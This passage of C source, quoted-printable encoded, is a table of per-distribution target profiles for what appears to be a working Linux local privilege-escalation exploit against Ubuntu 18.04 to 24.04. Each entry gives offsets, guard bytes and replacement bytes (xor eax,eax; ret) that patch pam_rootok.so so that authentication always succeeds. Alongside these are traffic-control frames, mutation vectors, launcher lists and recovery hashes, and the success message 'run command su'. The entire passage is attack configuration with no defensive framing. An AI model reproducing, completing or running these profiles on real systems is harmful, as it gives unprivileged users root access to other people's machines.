    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "ubuntu1804-k415-recovery",
    .recovery_sha256 =3D "33668266920619d51fcb1cdd1aa9f8440477352731c797a=
ed8ac454d07321ec7",
    .distribution_suite =3D "bionic",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1001, .expected_gid =3D 1001,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 88,
    .target_size =3D UINT64_C(0x2840), .target_offset =3D UINT64_C(0xca0)=
,
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 0,
    .guard_before =3D {
      0xff, 0xff, 0xeb, 0xc9, 0xe8, 0x17, 0xfd, 0xff, 0xff, 0x0f, 0x1f, 0=
x80, 0x00, 0x00, 0x00, 0x00
    }, .original_slice =3D {
      0x41, 0x56, 0x41, 0x55, 0x49, 0x89, 0xfd, 0x41
    }, .desired_slice =3D {
      0x31, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90
    }, .guard_after =3D {
      0x54, 0x55, 0x53, 0x48, 0x83, 0xec, 0x10, 0x64, 0x48, 0x8b, 0x04, 0=
x25, 0x28, 0x00, 0x00, 0x00
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x47, 0x00, 
      0x02, 0x54, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x51, 0x2d, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0=
x00, 0x01, 0x00, 0x00, 0x00, 
      0x00, 0x01, 0x83, 0xd6, 0x88, 0x1b, 0x50, 0x9b, 0xad, 0x70, 0xf4, 0=
x8e, 0x5a, 0xda, 0x3b, 0x06, 
      0x54, 0x3d, 0x64, 0x4a, 0x6a, 0xb6, 0x71, 0x39, 0xed, 0x13, 0x7c, 0=
x8d, 0xad, 0x4e, 0x74, 0x06, 
      0x47, 0x78, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x00, 0x00, 0x00, 0=
x00, 0x00, 0x00, 0x00, 0x00
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0x53, 0x6a, 0x80, 0x53, 0x4e, 0xce, 0xb4, 0x0c, 0xf9, 0=
x93, 0x64, 0xe6, 0xf2, 0x9a, 
      0x4f, 0xf0, 0x6f, 0xbc, 0x4b, 0xa1, 0x5a, 0xec, 0x4d, 0xa4, 0x96, 0=
x93, 0xe0, 0xd5, 0xaa, 0xc8, 
      0x50, 0xfc, 0x71, 0x46, 0x3c, 0x22, 0x28, 0x6b, 0x6d, 0x6f, 0x62, 0=
xbc, 0x4a, 0x89, 0x72, 0x1e, 
      0x5b, 0x8a, 0x5e, 0xb8, 0x13, 0x28, 0xdd, 0xcb, 0x39, 0xbb, 0x79, 0=
xda, 0xbe, 0xda, 0x03, 0x67, 
      0x88, 0x55, 0x27, 0x13, 0x3c, 0x4a, 0xe3, 0x84, 0x79, 0xb1, 0x1a, 0=
x3a, 0xe5, 0xc9, 0xde, 0x0f, 
      0x0c, 0x11, 0x42, 0x53, 0xa4, 0xdd, 0x7f, 0xe0, 0xb3, 0xf7, 0x86, 0=
x15, 0x6e, 0xac, 0x16, 0xc6, 
      0x71, 0x70, 0x61, 0xee, 0xc0, 0x15, 0x7c, 0x00, 0x7c, 0x79, 0x79, 0=
x1e, 0x78, 0x96, 0xcd, 0x12, 
      0xa7, 0xe9, 0xe4, 0x32, 0x9d, 0xfc, 0xc2, 0xf2, 0xd6, 0xda, 0x59, 0=
x88, 0xbe, 0x57, 0x35, 0xc8, 
      0xe8, 0x61, 0xd0, 0xef, 0xcf, 0x74, 0xcf, 0x85, 0x93, 0x55, 0x0a, 0=
xfa, 0xc9, 0xf1, 0x05, 0x02, 
      0x8d, 0x6b, 0x10, 0x37, 0xd1, 0xeb, 0x27, 0x65, 0x60, 0x18, 0x37, 0=
xe0, 0x13, 0x65, 0x6b, 0x54, 
      0xe0, 0x8e, 0x79, 0x04, 0x79, 0xe7, 0x79, 0x67, 0x9e, 0x51, 0xc5, 0=
x47, 0x08, 0xf0, 0x62, 0x22, 
      0x1b, 0x3e, 0xb4, 0xb8, 0xf9, 0x13, 0x7d, 0x2e, 0x51, 0x10, 0x9a, 0=
xac, 0xc7, 0x3c, 0x08, 0xf6, 
      0x18, 0xf3, 0xdc, 0x81, 0x5c, 0x85, 0x27, 0x54, 0x0d, 0x4d, 0x9c, 0=
xdf, 0x15, 0xbe, 0x98, 0x30, 
      0x52, 0x92, 0x85, 0x30, 0xd0, 0xa2, 0xf0, 0x09, 0x52, 0x69, 0xab, 0=
x88, 0x3c, 0xe0, 0x71, 0x88, 
      0xd9, 0x07, 0x58, 0x5d, 0x24, 0x02, 0xa2, 0xe4, 0x63, 0xa5, 0x6d, 0=
x0a, 0x4b, 0x29, 0x97, 0xa6, 
      0x41, 0xed, 0xc5, 0xac, 0xab, 0x51, 0x1b, 0xa6, 0x63, 0x6a, 0xd3, 0=
x75, 0x7b, 0xc7, 0x47, 0x3c, 
      0xa0, 0x62, 0xf2, 0x4f, 0x45, 0x81, 0xa9, 0x8f, 0x30, 0x96, 0xda, 0=
x50, 0x90, 0xc9, 0xdd, 0xc4, 
      0x9a, 0x18, 0x8f, 0x12, 0x8b, 0x06, 0x4d, 0xcf, 0x04, 0x85, 0xff, 0=
xf3, 0x78, 0x67, 0xea, 0xce, 
      0x40, 0xc2, 0xfc, 0x6e, 0x3a, 0x6d, 0x76, 0x38, 0x9f, 0x32, 0xca, 0=
x7c, 0xd7, 0xbc, 0x0c, 0x2d, 
      0x85, 0x40, 0xa0, 0x13, 0x43, 0x10, 0xf7, 0x10, 0xac, 0xe6, 0x2e, 0=
xc6, 0x6f, 0x73, 0xb0, 0x34, 
      0xca, 0x7a, 0x8e, 0xbe, 0xfb, 0x83, 0x05, 0x8b, 0x29, 0x6c, 0x8f, 0=
xaa, 0x01, 0xb0, 0xe0, 0x92, 
      0x88, 0x62, 0x62, 0xd3, 0xc6, 0x6f, 0x25, 0xc0, 0xba, 0x6a, 0xa7, 0=
x6a, 0xc8, 0xb3, 0x57, 0x89, 
      0x9e, 0x5b, 0x2c, 0x64, 0x44, 0x0c, 0x09, 0xb1, 0xfa, 0x68, 0x15, 0=
x64, 0x72, 0x1a, 0x84, 0x21, 
      0x9a, 0x51, 0x0d, 0x7b, 0xa4, 0xc4, 0x39, 0x02, 0x73, 0x76, 0xcd, 0=
x5b, 0x36, 0x8e, 0x00, 0x09, 
      0x33, 0xd4, 0xba, 0x39, 0xba, 0x0d, 0x3d, 0x1d, 0x60, 0x9f, 0x01, 0=
x35, 0x22, 0xe6, 0x81, 0xcc, 
      0x6d, 0x5f, 0xd3, 0x4f, 0xd2, 0xbd, 0xe5, 0x28, 0x54, 0x9d, 0x8e, 0=
x11, 0x17, 0x40, 0x61, 0x21, 
      0xda, 0xab, 0x16, 0x03, 0xbf, 0x66, 0x1d, 0x6f, 0x49, 0x31, 0x5b, 0=
x63, 0xd5, 0x71, 0x51, 0x73, 
      0xbc, 0x10, 0x0f, 0x11, 0x7a, 0x5d, 0x2f, 0x02, 0x80, 0x72, 0x60, 0=
x30, 0xbf, 0x6d, 0xf4, 0xa4, 
      0x57, 0x9a, 0x55, 0x7a, 0xf4, 0x1b, 0xf5, 0xd0, 0xdd, 0xa5, 0x54, 0=
x82, 0xd8, 0xed, 0xe3, 0x42, 
      0xce, 0x5a, 0xbf, 0x39, 0x6a, 0x4b, 0x05, 0x1e, 0x50, 0x25, 0x93, 0=
x23, 0xf5, 0x3d, 0xd7, 0xce, 
      0xd1, 0x3d, 0xb5, 0x67, 0x1e, 0x9e, 0x29, 0xcd, 0xa1, 0xb4, 0x7b, 0=
x51, 0x13, 0x0c, 0x03, 0x94, 
      0x39, 0x43, 0xe0, 0x83, 0x74, 0xd7, 0xb1, 0xc6, 0x3e, 0x21, 0xc4, 0=
x0f, 0x60, 0x97, 0x58, 0xc1, 
      0x88, 0x88
    },
  },
  [9] =3D {
    .profile_id =3D "ubuntu2204-ga515",
    .evidence_aliases =3D "ubuntu2204-ga515-host-poc,ubuntu2204-server-ga=
515-host-poc,ubuntu2204-desktop-ga515",
    .kernel_releases =3D "5.15.0-186-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "22.04",
    .package_name =3D "libpam-modules",
    .package_versions =3D "1.4.0-11ubuntu2.6",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "none",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "f49878d198e27a8f8ce2ded87871bc8011cefac2",
    .baseline_sha256 =3D "4341d3329b42cf229b20197e9e9e5c1b371834dd3ffdc9e=
dd0b8b3e0f40ee010",
    .mutated_sha256 =3D "a50fa6141af66022d29d593399101bc40c736e3447689506=
e46d8b293b63666d",
    .backing_page_sha256 =3D "5d7e16958849c78bb9164ecbe0513b1a39f7727c1c8=
ed608a686e7a074c9dc80",
    .package_query =3D "dpkg",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "embedded_u32",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "ubuntu2204-ga515-recovery",
    .recovery_sha256 =3D "d2bb0457478e7c1e2af52c1a3e8774c67d4513570710f7f=
0eb019ce2cfcd0a9b",
    .distribution_suite =3D "jammy",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1001, .expected_gid =3D 1001,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 88,
    .target_size =3D UINT64_C(0x37f8), .target_offset =3D UINT64_C(0x1584=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0xe8, 0xf7, 0xfb, 0xff, 0xff, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0=
x00, 0xf3, 0x0f, 0x1e, 0xfa
    }, .original_slice =3D {
      0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xfe, 0x41
    }, .desired_slice =3D {
      0x31, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90
    }, .guard_after =3D {
      0x55, 0x41, 0x54, 0x55, 0x53, 0x48, 0x83, 0xec, 0x08, 0x85, 0xd2, 0=
x7e, 0x77, 0x48, 0x63, 0xd2
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x47, 0x00, 
      0x02, 0x54, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x51, 0x2d, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0=
x00, 0x01, 0x00, 0x00, 0x00, 
      0x00, 0x01, 0x4d, 0xf7, 0x6a, 0x4c, 0xca, 0x64, 0x82, 0xad, 0x8f, 0=
xbf, 0x40, 0xe0, 0x20, 0x1c, 
      0xf7, 0x34, 0x0b, 0xfc, 0x4c, 0x1c, 0xb7, 0xbf, 0xaf, 0x6d, 0x0b, 0=
x36, 0x94, 0xff, 0x00, 0x28, 
      0x35, 0x71, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x00, 0x00, 0x00, 0=
x00, 0x00, 0x00, 0x00, 0x00
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0x9e, 0x91, 0xf3, 0x7b, 0xdb, 0xbe, 0xaf, 0x6f, 0xad, 0=
x16, 0x02, 0x94, 0xbc, 0xa0, 
      0x24, 0xfa, 0xb4, 0xe1, 0x30, 0xce, 0x4f, 0x88, 0x8f, 0xa2, 0x6e, 0=
x9a, 0xd4, 0x9c, 0x37, 0xdb, 
      0x82, 0xe5, 0x9a, 0x97, 0x6b, 0x13, 0x15, 0x46, 0xac, 0x7c, 0xb5, 0=
xdd, 0xc5, 0xce, 0x13, 0x41, 
      0x1b, 0xe2, 0x82, 0x3d, 0xa8, 0x88, 0x09, 0x9d, 0x7e, 0x87, 0x5a, 0=
xde, 0x9e, 0xd0, 0x58, 0xd3, 
      0x58, 0x9f, 0x44, 0x0b, 0xa0, 0x96, 0xaf, 0xfa, 0x32, 0x68, 0x5d, 0=
xdd, 0xa7, 0x41, 0x60, 0x14, 
      0x26, 0xce, 0x6e, 0xb5, 0x82, 0x21, 0xa8, 0xdc, 0x4b, 0x6b, 0x6c, 0=
x05, 0x5e, 0xf7, 0xd6, 0x04, 
      0x93, 0x36, 0x39, 0xfe, 0x56, 0xf6, 0xcc, 0xac, 0xb8, 0x4b, 0x11, 0=
xa7, 0x5d, 0xc3, 0x3b, 0x6c, 
      0x50, 0x71, 0xbf, 0xb6, 0x08, 0x82, 0x85, 0xa4, 0xe0, 0x4c, 0xf1, 0=
x49, 0x8f, 0xcc, 0xfb, 0xb6, 
      0x17, 0xc1, 0xee, 0x18, 0xe2, 0x82, 0x2d, 0x4e, 0x1c, 0x70, 0x90, 0=
x79, 0xc9, 0x8f, 0x3b, 0x2b, 
      0x0a, 0xe7, 0x15, 0x14, 0x0d, 0x70, 0xfc, 0x1c, 0x89, 0x60, 0x6b, 0=
x97, 0x1d, 0x73, 0x52, 0x2a, 
      0xad, 0x77, 0xff, 0x02, 0xd9, 0x08, 0x4c, 0x6e, 0x3c, 0x4e, 0x92, 0=
xe3, 0xc8, 0x96, 0xf9, 0xa8, 
      0x71, 0xb6, 0xb4, 0x45, 0x30, 0x92, 0x3e, 0xca, 0x07, 0x6b, 0xcb, 0=
x43, 0xb7, 0xc8, 0x0e, 0xac, 
      0x13, 0x0b, 0x49, 0x86, 0x87, 0x98, 0xd0, 0x05, 0xc8, 0xff, 0xa9, 0=
x78, 0x54, 0xe5, 0x34, 0xed, 
      0xbb, 0x64, 0x7b, 0xbf, 0xf7, 0xfa, 0xb0, 0x98, 0x5b, 0xfb, 0x7d, 0=
x01, 0xdd, 0x94, 0x63, 0x10, 
      0x00, 0x7e, 0x0d, 0xfd, 0x4c, 0x25, 0x03, 0xd0, 0x44, 0x76, 0x85, 0=
x4d, 0x2e, 0x7c, 0x5a, 0x21, 
      0x65, 0xa9, 0x0b, 0xbd, 0xd0, 0xa6, 0x2f, 0xff, 0xbd, 0x74, 0x0f, 0=
x41, 0x99, 0xd6, 0xe6, 0x87, 
      0xee, 0x32, 0xf4, 0x40, 0x49, 0x29, 0x3c, 0xe8, 0xd8, 0xba, 0xca, 0=
x23, 0x98, 0x4c, 0x95, 0xc9, 
      0x42, 0xe9, 0xb3, 0xbd, 0xb8, 0x60, 0xad, 0x42, 0x94, 0x82, 0xc6, 0=
xe8, 0xb0, 0x59, 0xe9, 0x39, 
      0xd7, 0x82, 0x0a, 0xa5, 0xc8, 0x28, 0x0a, 0xbb, 0xa2, 0x7f, 0x82, 0=
x2a, 0x81, 0xe2, 0xca, 0xb4, 
      0x5e, 0xf5, 0x78, 0x5f, 0x60, 0xfc, 0xa2, 0x5a, 0xc0, 0xc1, 0xa3, 0=
xc7, 0x3f, 0x64, 0x73, 0xb5, 
      0x9d, 0x77, 0xfd, 0x31, 0xfe, 0xaf, 0xa7, 0x07, 0x5e, 0x78, 0x9d, 0=
x96, 0x53, 0xf6, 0xa2, 0xe0, 
      0x08, 0x06, 0xce, 0x8e, 0x1b, 0xf5, 0x51, 0x09, 0xdc, 0x03, 0xd5, 0=
x16, 0x3f, 0xc1, 0x05, 0xd1, 
      0xff, 0x42, 0x3b, 0xe3, 0x4a, 0xd1, 0x5c, 0x98, 0x07, 0xcc, 0x1e, 0=
x31, 0x49, 0xf1, 0xf2, 0xe3, 
      0x0a, 0x4e, 0x62, 0x3d, 0x93, 0xc9, 0x9e, 0xb2, 0xe0, 0x44, 0x92, 0=
x5f, 0x2d, 0x79, 0x39, 0x8e, 
      0x03, 0x02, 0xa6, 0x5d, 0x50, 0xe7, 0x69, 0xa7, 0xf6, 0xdf, 0x47, 0=
xe1, 0x6d, 0xdf, 0x09, 0x33, 
      0x19, 0xd8, 0x7e, 0xb3, 0xd0, 0x35, 0xdc, 0x4a, 0x79, 0xff, 0x3d, 0=
xed, 0x7a, 0xbf, 0x01, 0x48, 
      0x3c, 0x13, 0x7a, 0xc9, 0x3b, 0x30, 0xf5, 0x7a, 0xf4, 0xf3, 0xb6, 0=
x60, 0x79, 0x50, 0x68, 0xa9, 
      0xa8, 0xfe, 0x6e, 0x34, 0x51, 0x40, 0x7e, 0xe4, 0xe6, 0x45, 0xc3, 0=
xf3, 0x52, 0xa6, 0x60, 0x07, 
      0x37, 0xc1, 0xa9, 0x0b, 0x51, 0x66, 0xce, 0x9a, 0x4a, 0xe7, 0x48, 0=
x40, 0xbb, 0x06, 0x97, 0x2f, 
      0x76, 0xd2, 0xe4, 0xdd, 0x1a, 0x0e, 0x83, 0xa1, 0x1a, 0x17, 0xc9, 0=
xf4, 0xd5, 0x68, 0x82, 0x6b, 
      0xf3, 0x76, 0x1b, 0x34, 0x65, 0x80, 0x8d, 0xf6, 0x78, 0x5b, 0x7d, 0=
x68, 0x50, 0x9f, 0x91, 0xf4, 
      0xe9, 0x9c, 0x49, 0xcf, 0x79, 0x71, 0x06, 0x8a, 0x41, 0xc6, 0x0a, 0=
x52, 0xf7, 0x96, 0x4f, 0x52, 
      0x97, 0x0b
    },
  },
  [10] =3D {
    .profile_id =3D "ubuntu2204-hwe68",
    .evidence_aliases =3D "ubuntu2204-hwe68-host-poc,ubuntu2204-server-hw=
e68,ubuntu2204-desktop-hwe68",
    .kernel_releases =3D "6.8.0-134-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "22.04",
    .package_name =3D "libpam-modules",
    .package_versions =3D "1.4.0-11ubuntu2.4",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "none",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "fe074e6139664c2a806acadb96dccbfa05108bda",
    .baseline_sha256 =3D "569d371ff1ca4d244920c9e9ed57e827108ffa3f4525d2c=
e95de8b4ede8f67b5",
    .mutated_sha256 =3D "ab99131f6350cdaebcd8b04d69b29ce0a16bfe22c2567ba6=
4a829fcbef1ecae3",
    .backing_page_sha256 =3D "5d7e16958849c78bb9164ecbe0513b1a39f7727c1c8=
ed608a686e7a074c9dc80",
    .package_query =3D "dpkg",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "embedded_u32",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "ubuntu2204-hwe68-recovery",
    .recovery_sha256 =3D "b1ba4df8a56f2d536458552016e1a46ced108ea476c46d2=
ae29aee521d1f549b",
    .distribution_suite =3D "jammy",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1001, .expected_gid =3D 1001,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x37f8), .target_offset =3D UINT64_C(0x1584=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0xe8, 0xf7, 0xfb, 0xff, 0xff, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0=
x00, 0xf3, 0x0f, 0x1e, 0xfa
    }, .original_slice =3D {
      0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xfe, 0x41
    }, .desired_slice =3D {
      0x31, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90
    }, .guard_after =3D {
      0x55, 0x41, 0x54, 0x55, 0x53, 0x48, 0x83, 0xec, 0x08, 0x85, 0xd2, 0=
x7e, 0x77, 0x48, 0x63, 0xd2
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x62, 0=
x13, 0xb2, 0x01, 0xc4, 0xe1, 
      0xcc, 0xb6, 0x07, 0x55, 0x40, 0xab, 0xe1, 0xc9, 0x77, 0x88, 0x26, 0=
xda, 0x9d, 0x7f, 0x66, 0x3e, 
      0x99, 0x14, 0x2d, 0x40, 0x9b, 0x21, 0xdd, 0xa9, 0x24, 0x75, 0x7b, 0=
x8c, 0x3c, 0x6c, 0xc7, 0xcf, 
      0xaf, 0x6d, 0x0b, 0x36, 0x94, 0xff, 0x00, 0x28, 0x45, 0x01, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0xe0, 0x6a, 0x5e, 0x03, 0x96, 0xc7, 0x43, 0xfc, 0xd8, 0=
x58, 0xa8, 0x97, 0xb1, 0x84, 
      0x60, 0xd6, 0x13, 0x8f, 0x33, 0x83, 0x04, 0xe6, 0xc9, 0xc3, 0xfa, 0=
x13, 0xc5, 0xe7, 0xed, 0x86, 
      0x7d, 0xde, 0x23, 0x48, 0x80, 0xac, 0xa9, 0xd8, 0x6a, 0xdc, 0x0c, 0=
x5f, 0x81, 0xd3, 0x18, 0x66, 
      0x26, 0x88, 0x89, 0x85, 0xfa, 0x4c, 0xcf, 0x90, 0xf6, 0xf8, 0x89, 0=
x98, 0xcc, 0x87, 0x1a, 0x11, 
      0xde, 0xb9, 0x42, 0x57, 0x54, 0xa2, 0x4c, 0x2a, 0xd9, 0x95, 0xee, 0=
x9b, 0x9a, 0xbc, 0x9f, 0x17, 
      0x07, 0x41, 0x81, 0x52, 0x99, 0x93, 0xb8, 0x67, 0xe3, 0xe6, 0xbd, 0=
x8e, 0x0a, 0xd5, 0x38, 0x1c, 
      0xc0, 0x47, 0x95, 0x56, 0xf1, 0xf7, 0xc1, 0xa3, 0x34, 0x15, 0x4f, 0=
xe2, 0xdd, 0x45, 0xf8, 0x1f, 
      0xfd, 0x32, 0x07, 0xe9, 0x66, 0x5c, 0x42, 0x94, 0x9f, 0xbf, 0x90, 0=
x2e, 0x55, 0x73, 0x90, 0xaa, 
      0xac, 0x87, 0x81, 0xb2, 0xfa, 0xeb, 0x3b, 0xb3, 0x60, 0x20, 0xa4, 0=
x63, 0xec, 0xd6, 0xe0, 0xf3, 
      0x15, 0x25, 0xa5, 0xd8, 0x1d, 0xbc, 0x80, 0x23, 0xf6, 0xaf, 0x76, 0=
x36, 0x5e, 0xa7, 0x18, 0x85, 
      0x37, 0x29, 0x49, 0x9e, 0xcd, 0x74, 0xa0, 0x40, 0x0a, 0x3d, 0x73, 0=
x21, 0x10, 0x6e, 0x16, 0xe9, 
      0xca, 0xc0, 0xbd, 0x08, 0x9f, 0xaa, 0x54, 0x33, 0xb4, 0xbd, 0xe0, 0=
x4a, 0x8b, 0xa6, 0xaa, 0xcc, 
      0xa5, 0x8d, 0x1f, 0x0a, 0x2a, 0x70, 0x0d, 0xe3, 0x2e, 0x75, 0x01, 0=
x98, 0xaa, 0x19, 0xa8, 0x6b, 
      0x82, 0x82, 0x00, 0xbc, 0xfc, 0xab, 0xcb, 0x2d, 0x57, 0x40, 0xee, 0=
x33, 0xff, 0x65, 0x53, 0xda, 
      0xad, 0xb6, 0x60, 0x5d, 0x2b, 0x56, 0xad, 0xca, 0xd5, 0x0a, 0x36, 0=
xe4, 0x8d, 0xc1, 0xc8, 0x6a, 
      0x54, 0x85, 0x3e, 0x51, 0x1e, 0xba, 0x10, 0x2c, 0x81, 0x6c, 0x4e, 0=
xa6, 0xb4, 0x42, 0x53, 0x55, 
      0xee, 0x9c, 0xe0, 0x97, 0xa7, 0x95, 0xca, 0x7f, 0x84, 0x0e, 0x93, 0=
x7c, 0x57, 0xec, 0x50, 0x54, 
      0xff, 0xd8, 0x47, 0xe1, 0x8b, 0x82, 0x62, 0xea, 0xab, 0x2b, 0x97, 0=
xa7, 0x1b, 0x5e, 0x63, 0x62, 
      0x64, 0xfd, 0xde, 0x10, 0x37, 0x0e, 0x4b, 0x6d, 0x86, 0x9e, 0x47, 0=
x25, 0x97, 0xf2, 0x0b, 0x0a, 
      0xa5, 0xb3, 0x46, 0x7c, 0x65, 0x7f, 0x93, 0x3a, 0x68, 0x43, 0xf5, 0=
xc3, 0x7a, 0xfc, 0xf8, 0x17, 
      0x44, 0xfd, 0x53, 0x23, 0xc4, 0xfb, 0x0e, 0xb8, 0x8a, 0x8a, 0x74, 0=
x1f, 0xc6, 0xc0, 0xa0, 0x28, 
      0x53, 0xc0, 0xd8, 0x3e, 0xc8, 0xe7, 0x66, 0xfc, 0xb0, 0xb2, 0xdc, 0=
x7e, 0xd4, 0x92, 0xdd, 0x8e, 
      0x90, 0x18, 0xb3, 0x3a, 0xa2, 0x8a, 0x90, 0x08, 0xd8, 0x84, 0x5c, 0=
x4b, 0xab, 0x6e, 0x9e, 0x7d, 
      0x41, 0x4b, 0x92, 0xb3, 0x6a, 0xe3, 0x47, 0xe7, 0x5c, 0x36, 0x52, 0=
x05, 0xbf, 0x75, 0x6c, 0xa6, 
      0xa3, 0x14, 0x9a, 0x31, 0x0f, 0x97, 0xb2, 0x57, 0xd8, 0x60, 0xa8, 0=
xba, 0xeb, 0x27, 0x10, 0xd0, 
      0x3f, 0xda, 0x8a, 0xb5, 0xd8, 0x63, 0x33, 0xe3, 0xc2, 0x55, 0xf6, 0=
x1f, 0xb8, 0xe3, 0x34, 0x30, 
      0x00, 0xf8, 0x79, 0x65, 0xcd, 0x67, 0xd1, 0xb2, 0x12, 0x04, 0xbd, 0=
x8b, 0xae, 0xc9, 0x7a, 0xdb, 
      0xd7, 0x23, 0xc2, 0xef, 0x1f, 0xf2, 0xa2, 0x1f, 0x3b, 0x10, 0x32, 0=
xe6, 0xb7, 0xf2, 0xa0, 0x9d, 
      0x7a, 0xe3, 0x25, 0xfb, 0x6d, 0xff, 0xa8, 0x4e, 0x96, 0xcd, 0x27, 0=
x67, 0x4b, 0x74, 0xee, 0xff, 
      0x8e, 0xba, 0x83, 0xfa, 0x31, 0x4c, 0x56, 0xe5, 0x52, 0xdd, 0x28, 0=
x72, 0xf2, 0x32, 0x7f, 0xcd, 
      0xd9, 0x6d, 0x21, 0x4e, 0x71, 0xb1, 0xe6, 0xaf, 0xfc, 0x7c, 0x31, 0=
xe3, 0x77, 0x47, 0x31, 0x08, 
      0xf7, 0x58, 0x72, 0x60, 0x05, 0x4a, 0xa0, 0xa6, 0xab, 0x5b, 0xf7, 0=
x4c, 0x15, 0x97, 0x70, 0x31, 
      0xe7, 0x17
    },
  },
  [11] =3D {
    .profile_id =3D "ubuntu2404-hwe70-launcher",
    .evidence_aliases =3D "ubuntu2404-hwe70-rootlesskit-host-poc,ubuntu24=
04-server-hwe70,ubuntu2404-desktop-hwe70",
    .kernel_releases =3D "7.0.0-28-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "24.04",
    .package_name =3D "libpam-modules:amd64",
    .package_versions =3D "1.5.3-5ubuntu5.5",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "apparmor:unconfined",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "87f6370e110e3020d23c1f7ee064600dd8672680",
    .baseline_sha256 =3D "48ebc2d5eeb3b3d90a6a8bd02e95dbba6272e8ce2cd3408=
8d5aa8a71d613db34",
    .mutated_sha256 =3D "7b0654d74aa7f5fc072f415292b9e27ca344c6a55ed88c05=
5c85c0b5faea6da7",
    .backing_page_sha256 =3D "f8105e4c077570c1e482783056b360d8ce31d3ff979=
e5ffc4faa5f54ea2d2989",
    .package_query =3D "dpkg",
    .execution_mode =3D "ubuntu_optional_launcher",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,mm=
debstrap",
    .automatic_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,=
mmdebstrap",
    .recovery_artifact =3D "ubuntu2404-hwe70-launcher-recovery",
    .recovery_sha256 =3D "ec212f59e519dec0a4d64bd3b6592e29c8cfcfd221cd91b=
16592adb22d454aff",
    .distribution_suite =3D "noble",
    .allowed_supplementary_groups =3D "100",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3898), .target_offset =3D UINT64_C(0x1486=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0x10, 0x64, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0=
x89, 0x45, 0xd8, 0x31, 0xc0
    }, .original_slice =3D {
      0xe8, 0xf5, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
